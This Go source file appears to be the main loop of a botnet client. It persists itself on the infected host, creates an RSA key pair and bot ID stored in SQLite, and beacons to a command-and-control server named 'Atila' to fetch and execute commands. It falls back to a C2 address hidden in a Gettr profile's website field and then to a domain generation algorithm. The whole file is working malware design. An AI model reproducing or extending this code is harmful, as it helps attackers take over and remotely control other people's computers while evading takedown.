package main

import (
	"crypto/rsa"
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/google/uuid"
)

// Key-pair used for signing and verifying messages.
var privateIdentificationKey *rsa.PrivateKey
var publicIdentificationKey *rsa.PublicKey

// Generate the unique bot identifier.
var id string

// Last time since the contact was made with bot herder.
var lastContactMade int = timeSinceJesus()

// Does Atila (cnc) knows about us?
var identified bool = false

// tick is the content of the main loop. Returns false if something went wrong.
func tick(host string) bool {
	if !identified {
		identified = identify(host, id, publicIdentificationKey)
		return false
	}

	messages, err := fetchMessages(host, id)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}

	for _, message := range messages {
		reply, err := interpretMessage(host, message)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		err = sendMessage(host, reply)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		err = messageAck(host, reply.ReplyTo)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
	}

	return true
}

func initialize() {
	// Initialize a SQLite database and run the migrations.
	err := dbInit()
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	// Check the database for details about self.
	botDetails, err := dbGetBotDetails()
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	// Check if we ever saved details about ourselves.
	if len(botDetails.Id) == 0 && len(botDetails.PublicKey) == 0 && len(botDetails.PrivateKey) == 0 {
		// Key-pair used for signing and verifying messages.
		privateIdentificationKey = generatePrivateKey()
		publicIdentificationKey = &privateIdentificationKey.PublicKey
		// Generate the unique bot identifier.
		id = uuid.New().String()

		// Save into the database.
		dbInsertBotDetails(id, privateKeyToPEM(privateIdentificationKey), publicKeyToPEM(publicIdentificationKey))
	} else {
		// Load into global variables bot's details.
		privateIdentificationKey = importPEMPrivateKey(botDetails.PrivateKey)
		publicIdentificationKey = importPEMPublicKey(botDetails.PublicKey)
		id = botDetails.Id
	}

	fmt.Println(botDetails)
}

func main() {
	// Check if the bot is persistent within the environment, if not then persist.
	if !checkIfPersisted() {
		err := persist()
		fmt.Println(err)
	}

	// Once the bot is started we need to load some variables and prepare it for normal work.
	initialize()

	for range time.Tick(time.Second + time.Duration(rand.Intn(maxLoopWait-minLoopWait)+maxLoopWait)) {
		rand.Seed(time.Now().UnixNano())

		// We need to reach out to hardcoded host of Atila. (cnc)
		if tick(atilaHost) {
			// Reset the timer of DGA and move on...
			lastContactMade = timeSinceJesus()
			continue
		}

		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
		gettrAtilaHost, err := gettrProfileWebsite(gettrProfileName)
		if err == nil {
			if tick(gettrAtilaHost) {
				// Reset the timer of DGA and move on...
				lastContactMade = timeSinceJesus()
				continue
			}
		}

		// Check if DGA should kick it.
		if timeSinceJesus()-lastContactMade > dgaAfterDays {
			// Try to find the Atila (cnc) behind a generated domain.
			for _, host := range dga(dgaSeed) {
				if _, err := net.LookupIP(host); err != nil {
					continue
				}
				if tick(host) {
					break
				}
			}
		}
	}
}
